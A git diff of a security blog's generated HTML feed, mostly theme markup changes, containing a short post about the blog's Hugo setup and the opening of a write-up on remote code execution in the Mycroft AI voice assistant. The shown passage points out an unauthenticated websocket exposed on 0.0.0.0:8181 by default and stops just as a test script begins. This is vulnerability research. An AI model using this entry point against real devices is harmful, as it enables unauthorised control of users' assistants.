+    <a href="#how-this-blog-works" class="header-mark" aria-label="Header mark for 'How this blog works'"></a>1 How this blog works</h2><p>The setup is pretty simple, I&rsquo;m using <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">hugo</a> to build static pages and publish them on GitHub pages. There is a <a href="https://github.com/peaceiris/actions-hugo" target="_blank" rel="noopener noreferrer">Github Action</a> running that builds and deploy the pages every time a PR is approved on the <code>main</code> branch.
+<figure><img  loading="lazy" src="/posts/long-time-no-see/blog_CI_CD.png"    height="746" width="1104"><figcaption class="image-caption">A graph represeting the logic flow behind the blog deployment system</figcaption>
+</figure></p>
 <p>The theme used is <a href="https://hugoloveit.com/" target="_blank" rel="noopener noreferrer">LoveIt</a>, it&rsquo;s pretty cool and rich of features but has few bugs that need to be fixed; for example, if you are using the blog in Italian you can see that the localization is pretty much fucked up.
 The theme localization it&rsquo;s a pretty cool feature but having to rewrite the same post for each language is painful, so I&rsquo;m thinking about adding the support to DeepL.</p>
 <p>Last but not least, the blog got a new logo:
-<figure><a class="lightgallery" href="/images/logo.png" title="/images/logo.png" data-thumbnail="/images/logo.png" data-sub-html="<h2>appsec.space logo</h2>">
-        <img
-            
-            loading="lazy"
-            src="/images/logo.png"
-            srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
-            sizes="auto"
-            alt="/images/logo.png">
-    </a><figcaption class="image-caption">appsec.space logo</figcaption>
-    </figure></p>
+<figure><img  loading="lazy" src="/images/logo.png"     ><figcaption class="image-caption">appsec.space logo</figcaption>
+</figure></p>
 <p>it was generated by <a href="https://midjourney.com" target="_blank" rel="noopener noreferrer">Midjourney</a> and means absolutely nothing!</p>
 <h2 id="the-future" class="headerLink">
-    <a href="#the-future" class="header-mark"></a>2 The future</h2><p>What&rsquo;s next, you ask? Well.. a lot of stuff actually. First of all I need to migrate all the posts from the old blog because I would like to retain an archive. Next I can start writing new posts.</p>
+    <a href="#the-future" class="header-mark" aria-label="Header mark for 'The future'"></a>2 The future</h2><p>What&rsquo;s next, you ask? Well.. a lot of stuff actually. First of all I need to migrate all the posts from the old blog because I would like to retain an archive. Next I can start writing new posts.</p>
 <div class="details admonition note open">
-        <div class="details-summary admonition-title">
-            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content">If you get a redirect from the old blog to the new one the process has been completed.</div>
-        </div>
+    <div class="details-summary admonition-title">
+        <span class="icon"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg></span>Note<span class="details-icon"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"/></svg></span>
     </div>
+    <div class="details-content">
+        <div class="admonition-content">If you get a redirect from the old blog to the new one the process has been completed.</div></div></div>
 <p>Despite being called <code>appsec.space</code> I would like to talk about different topics, spacing from Application Security to Malware Developmemnt (for learning purposes <a href="https://www.youtube.com/watch?v=HmZm8vNHBSU" target="_blank" rel="noopener noreferrer">of course</a>), to productivity setup and generic rants, basically turning this blog into my stream of counciousness.</p>
 <p>The next post will probably talk about the <a href="https://en.wikipedia.org/wiki/Security_theater" target="_blank" rel="noopener noreferrer">Security Theater</a>.</p>
 <p>See you then!</p>]]></description></item><item><title>Getting "Zero Click" Remote Code Execution in Mycroft AI vocal assistant</title><link>https://appsec.space/posts/mycroft-ai-rce/</link><pubDate>Sun, 10 Jun 2018 20:59:09 +0200</pubDate><author><name>himazawa</name></author><guid>https://appsec.space/posts/mycroft-ai-rce/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/posts/mycroft-ai-rce/mycroft.png" referrerpolicy="no-referrer">
             </div><h2 id="introduction" class="headerLink">
-    <a href="#introduction" class="header-mark"></a>1 Introduction</h2><p>During my journey contributing to open source I was working with my friend <a href="https://github.com/portaloffreedom" target="_blank" rel="noopener noreferrer">Matteo De Carlo</a> on an <a href="https://git.covolunablu.org/portaloffreedom/plasma-mycroft-PKGBUILD" target="_blank" rel="noopener noreferrer">AUR Package</a> of a really interesting project called <a href="https://mycroft.ai" target="_blank" rel="noopener noreferrer">Mycroft AI</a>. It&rsquo;s an AI-powered vocal assistant started with a <a href="https://www.kickstarter.com/projects/aiforeveryone/mycroft-an-open-source-artificial-intelligence-for" target="_blank" rel="noopener noreferrer">crowdfunding campaign</a> in 2015 and a <a href="https://www.indiegogo.com/projects/mycroft-mark-ii-the-open-voice-assistant#/" target="_blank" rel="noopener noreferrer">more recent one</a> that allowed Mycroft to produce their Mark-I and Mark-II devices. It&rsquo;s also running on Linux Desktop/Server, Raspberry PI and will be available soon™ on <a href="https://www.youtube.com/watch?v=6GHmzbXp_jY" target="_blank" rel="noopener noreferrer">Jaguar F-Type</a> and <a href="https://mycroft.ai/blog/mycroft-welcomes-jaguar-land-rover-new-investor/" target="_blank" rel="noopener noreferrer">Land Rover</a></p>
+    <a href="#introduction" class="header-mark" aria-label="Header mark for 'Introduction'"></a>1 Introduction</h2><p>During my journey contributing to open source I was working with my friend <a href="https://github.com/portaloffreedom" target="_blank" rel="noopener noreferrer">Matteo De Carlo</a> on an <a href="https://git.covolunablu.org/portaloffreedom/plasma-mycroft-PKGBUILD" target="_blank" rel="noopener noreferrer">AUR Package</a> of a really interesting project called <a href="https://mycroft.ai" target="_blank" rel="noopener noreferrer">Mycroft AI</a>. It&rsquo;s an AI-powered vocal assistant started with a <a href="https://www.kickstarter.com/projects/aiforeveryone/mycroft-an-open-source-artificial-intelligence-for" target="_blank" rel="noopener noreferrer">crowdfunding campaign</a> in 2015 and a <a href="https://www.indiegogo.com/projects/mycroft-mark-ii-the-open-voice-assistant#/" target="_blank" rel="noopener noreferrer">more recent one</a> that allowed Mycroft to produce their Mark-I and Mark-II devices. It&rsquo;s also running on Linux Desktop/Server, Raspberry PI and will be available soon™ on <a href="https://www.youtube.com/watch?v=6GHmzbXp_jY" target="_blank" rel="noopener noreferrer">Jaguar F-Type</a> and <a href="https://mycroft.ai/blog/mycroft-welcomes-jaguar-land-rover-new-investor/" target="_blank" rel="noopener noreferrer">Land Rover</a></p>
 <h2 id="digging-in-the-source-code" class="headerLink">
-    <a href="#digging-in-the-source-code" class="header-mark"></a>2 Digging in the source code</h2><p>While looking at the <a href="https://github.com/MycroftAI/mycroft-core" target="_blank" rel="noopener noreferrer">source code</a> I found an interesting point: <a href="https://github.com/MycroftAI/mycroft-core/blob/1f4c98f29ceb6a7981474f1620441e43aa364d00/mycroft/messagebus/service/main.py#L28-L57" target="_blank" rel="noopener noreferrer">here</a></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...</span>
+    <a href="#digging-in-the-source-code" class="header-mark" aria-label="Header mark for 'Digging in the source code'"></a>2 Digging in the source code</h2><p>While looking at the <a href="https://github.com/MycroftAI/mycroft-core" target="_blank" rel="noopener noreferrer">source code</a> I found an interesting point: <a href="https://github.com/MycroftAI/mycroft-core/blob/1f4c98f29ceb6a7981474f1620441e43aa364d00/mycroft/messagebus/service/main.py#L28-L57" target="_blank" rel="noopener noreferrer">here</a></p>
+<div class="code-block highlight is-closed show-line-numbers  tw-group tw-my-2">
+  <div class="
+    code-block-title 
+    
+    tw-flex 
+    tw-flex-row 
+    tw-justify-between 
+    tw-w-full tw-bg-bgColor-secondary
+    ">      
+    <button 
+      class="
+        tw-select-none 
+        tw-mx-2 
+        tw-block
+        group-[.is-open]:tw-rotate-90
+        tw-transition-[transform] 
+        tw-duration-500 
+        tw-ease-in-out
+        print:!tw-hidden"
+      disabled
+      aria-hidden="true"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"/></svg></button>
+
+    <div class="code-block-title-bar tw-w-full">
+      <p class="tw-select-none !tw-my-1">python</p>
+    </div>
+    <div class="tw-flex">
+      <button 
+        class="
+          line-number-button
+          tw-select-none 
+          tw-mx-2 
+          tw-hidden 
+          group-[.is-open]:tw-block 
+          group-[.show-line-numbers]:tw-text-fgColor-link 
+          print:!tw-hidden" 
+        title="Toggle line numbers"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M61.77 401l17.5-20.15a19.92 19.92 0 0 0 5.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8h22.83a157.41 157.41 0 0 0-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33 0 15.94 2.44 15.94 9.09 0 4.72-4.2 8.22-14.36 8.22a41.54 41.54 0 0 1-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16 0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zm0-160H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16V80a16 16 0 0 0-16-16zm0 320H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zM16 160h64a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H64V40a8 8 0 0 0-8-8H32a8 8 0 0 0-7.14 4.42l-8 16A8 8 0 0 0 24 64h8v64H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8zm-3.91 160H80a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H41.32c3.29-10.29 48.34-18.68 48.34-56.44 0-29.06-25-39.56-44.47-39.56-21.36 0-33.8 10-40.46 18.75-4.37 5.59-3 10.84 2.8 15.37l8.58 6.88c5.61 4.56 11 2.47 16.12-2.44a13.44 13.44 0 0 1 9.46-3.84c3.33 0 9.28 1.56 9.28 8.75C51 248.19 0 257.31 0 304.59v4C0 316 5.08 320 12.09 320z"/></svg></button>
+
+      <button 
+        class="
+          wrap-code-button
+          tw-select-none 
+          tw-mx-2 
+          tw-hidden 
+          group-[.is-open]:tw-block 
+          group-[.is-wrap]:tw-text-fgColor-link 
+          print:!tw-hidden" 
+        title="Toggle code wrap"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg></button>
+      
+      <button 
+        class="
+          copy-code-button
+          tw-select-none
+          tw-mx-2 
+          tw-hidden
+          group-[.is-open]:tw-block
+          hover:tw-text-fgColor-link 
+          print:!tw-hidden"
+        title="Copy code">
+          <span class="copy-icon tw-block"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M433.941 65.941l-51.882-51.882A48 48 0 0 0 348.118 0H176c-26.51 0-48 21.49-48 48v48H48c-26.51 0-48 21.49-48 48v320c0 26.51 21.49 48 48 48h224c26.51 0 48-21.49 48-48v-48h80c26.51 0 48-21.49 48-48V99.882a48 48 0 0 0-14.059-33.941zM266 464H54a6 6 0 0 1-6-6V150a6 6 0 0 1 6-6h74v224c0 26.51 21.49 48 48 48h96v42a6 6 0 0 1-6 6zm128-96H182a6 6 0 0 1-6-6V54a6 6 0 0 1 6-6h106v88c0 13.255 10.745 24 24 24h88v202a6 6 0 0 1-6 6zm6-256h-64V48h9.632c1.591 0 3.117.632 4.243 1.757l48.368 48.368a6 6 0 0 1 1.757 4.243V112z"/></svg></span>
+          <span class="check-icon tw-hidden"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"/></svg></span>
+      </button>
+        
+      <button 
+        class="
+          tw-select-none 
+          tw-mx-2 
+          tw-block 
+          group-[.is-open]:tw-hidden 
+          print:!tw-hidden" 
+        disabled
+        aria-hidden="true"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z"/></svg></button>
+    </div>
+  </div>
+  <pre style="counter-reset: codeblock;" class="tw-block tw-m-0 tw-p-0"><code 
+    id="codeblock-id-1" 
+    class="
+      chroma 
+      !tw-block 
+      tw-p-0
+      tw-m-0
+      tw-transition-[max-height] 
+      tw-duration-500 
+      tw-ease-in-out 
+      group-[.is-closed]:!tw-max-h-0 
+      group-[.is-wrap]:tw-text-wrap
+      tw-overflow-y-hidden
+      tw-overflow-x-auto
+      tw-scrollbar-thin
+      "><span class="line"><span class="cl"><span class="o">...</span>
 </span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;host&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;port&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">route</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;route&#34;</span><span class="p">)</span>
@@ -279,49 +330,207 @@ The theme localization it&rsquo;s a pretty cool feature but having to rewrite th
 </span></span><span class="line"><span class="cl"><span class="n">application</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">Application</span><span class="p">(</span><span class="n">routes</span><span class="p">,</span> <span class="o">**</span><span class="n">settings</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">application</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">ioloop</span><span class="o">.</span><span class="n">IOLoop</span><span class="o">.</span><span class="n">instance</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="o">...</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="o">...</span></span></span></code></pre>
 </div>
-</div><p>it defines a websocket server that uses to get instructions from the remote clients (like the <a href="https://github.com/MycroftAI/Mycroft-Android" target="_blank" rel="noopener noreferrer">Android one</a>). The settings for the websocket server are defined in <a href="https://github.com/MycroftAI/mycroft-core/blob/aa594aebea99eebd0109ad013b71a2210f2b72f4/mycroft/configuration/mycroft.conf#L111-L117" target="_blank" rel="noopener noreferrer">mycroft.conf</a></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// The mycroft-core messagebus&#39; websocket
+<p>it defines a websocket server that uses to get instructions from the remote clients (like the <a href="https://github.com/MycroftAI/Mycroft-Android" target="_blank" rel="noopener noreferrer">Android one</a>). The settings for the websocket server are defined in <a href="https://github.com/MycroftAI/mycroft-core/blob/aa594aebea99eebd0109ad013b71a2210f2b72f4/mycroft/configuration/mycroft.conf#L111-L117" target="_blank" rel="noopener noreferrer">mycroft.conf</a></p>
+<div class="code-block highlight is-open show-line-numbers  tw-group tw-my-2">
+  <div class="
+    code-block-title 
+    
+    tw-flex 
+    tw-flex-row 
+    tw-justify-between 
+    tw-w-full tw-bg-bgColor-secondary
+    ">      
+    <button 
+      class="
+        tw-select-none 
+        tw-mx-2 
+        tw-block
+        group-[.is-open]:tw-rotate-90
+        tw-transition-[transform] 
+        tw-duration-500 
+        tw-ease-in-out
+        print:!tw-hidden"
+      disabled
+      aria-hidden="true"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"/></svg></button>
+
+    <div class="code-block-title-bar tw-w-full">
+      <p class="tw-select-none !tw-my-1">json</p>
+    </div>
+    <div class="tw-flex">
+      <button 
+        class="
+          line-number-button
+          tw-select-none 
+          tw-mx-2 
+          tw-hidden 
+          group-[.is-open]:tw-block 
+          group-[.show-line-numbers]:tw-text-fgColor-link 
+          print:!tw-hidden" 
+        title="Toggle line numbers"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M61.77 401l17.5-20.15a19.92 19.92 0 0 0 5.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8h22.83a157.41 157.41 0 0 0-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33 0 15.94 2.44 15.94 9.09 0 4.72-4.2 8.22-14.36 8.22a41.54 41.54 0 0 1-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16 0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zm0-160H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16V80a16 16 0 0 0-16-16zm0 320H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zM16 160h64a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H64V40a8 8 0 0 0-8-8H32a8 8 0 0 0-7.14 4.42l-8 16A8 8 0 0 0 24 64h8v64H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8zm-3.91 160H80a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H41.32c3.29-10.29 48.34-18.68 48.34-56.44 0-29.06-25-39.56-44.47-39.56-21.36 0-33.8 10-40.46 18.75-4.37 5.59-3 10.84 2.8 15.37l8.58 6.88c5.61 4.56 11 2.47 16.12-2.44a13.44 13.44 0 0 1 9.46-3.84c3.33 0 9.28 1.56 9.28 8.75C51 248.19 0 257.31 0 304.59v4C0 316 5.08 320 12.09 320z"/></svg></button>
+
+      <button 
+        class="
+          wrap-code-button
+          tw-select-none 
+          tw-mx-2 
+          tw-hidden 
+          group-[.is-open]:tw-block 
+          group-[.is-wrap]:tw-text-fgColor-link 
+          print:!tw-hidden" 
+        title="Toggle code wrap"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg></button>
+      
+      <button 
+        class="
+          copy-code-button
+          tw-select-none
+          tw-mx-2 
+          tw-hidden
+          group-[.is-open]:tw-block
+          hover:tw-text-fgColor-link 
+          print:!tw-hidden"
+        title="Copy code">
+          <span class="copy-icon tw-block"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M433.941 65.941l-51.882-51.882A48 48 0 0 0 348.118 0H176c-26.51 0-48 21.49-48 48v48H48c-26.51 0-48 21.49-48 48v320c0 26.51 21.49 48 48 48h224c26.51 0 48-21.49 48-48v-48h80c26.51 0 48-21.49 48-48V99.882a48 48 0 0 0-14.059-33.941zM266 464H54a6 6 0 0 1-6-6V150a6 6 0 0 1 6-6h74v224c0 26.51 21.49 48 48 48h96v42a6 6 0 0 1-6 6zm128-96H182a6 6 0 0 1-6-6V54a6 6 0 0 1 6-6h106v88c0 13.255 10.745 24 24 24h88v202a6 6 0 0 1-6 6zm6-256h-64V48h9.632c1.591 0 3.117.632 4.243 1.757l48.368 48.368a6 6 0 0 1 1.757 4.243V112z"/></svg></span>
+          <span class="check-icon tw-hidden"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"/></svg></span>
+      </button>
+        
+      <button 
+        class="
+          tw-select-none 
+          tw-mx-2 
+          tw-block 
+          group-[.is-open]:tw-hidden 
+          print:!tw-hidden" 
+        disabled
+        aria-hidden="true"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z"/></svg></button>
+    </div>
+  </div>
+  <pre style="counter-reset: codeblock;" class="tw-block tw-m-0 tw-p-0"><code 
+    id="codeblock-id-1" 
+    class="
+      chroma 
+      !tw-block 
+      tw-p-0
+      tw-m-0
+      tw-transition-[max-height] 
+      tw-duration-500 
+      tw-ease-in-out 
+      group-[.is-closed]:!tw-max-h-0 
+      group-[.is-wrap]:tw-text-wrap
+      tw-overflow-y-hidden
+      tw-overflow-x-auto
+      tw-scrollbar-thin
+      "><span class="line"><span class="cl"><span class="c1">// The mycroft-core messagebus&#39; websocket
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="s2">&#34;websocket&#34;</span><span class="err">:</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&#34;host&#34;</span><span class="p">:</span> <span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&#34;port&#34;</span><span class="p">:</span> <span class="mi">8181</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&#34;route&#34;</span><span class="p">:</span> <span class="s2">&#34;/core&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&#34;ssl&#34;</span><span class="p">:</span> <span class="kc">false</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="err">,</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="err">,</span></span></span></code></pre>
 </div>
-</div><p>So there is a websocket server that doesn&rsquo;t require authentication that by default is exposed on <code>0.0.0.0:8181/core</code>. Let&rsquo;s test it 😉</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+<p>So there is a websocket server that doesn&rsquo;t require authentication that by default is exposed on <code>0.0.0.0:8181/core</code>. Let&rsquo;s test it 😉</p>
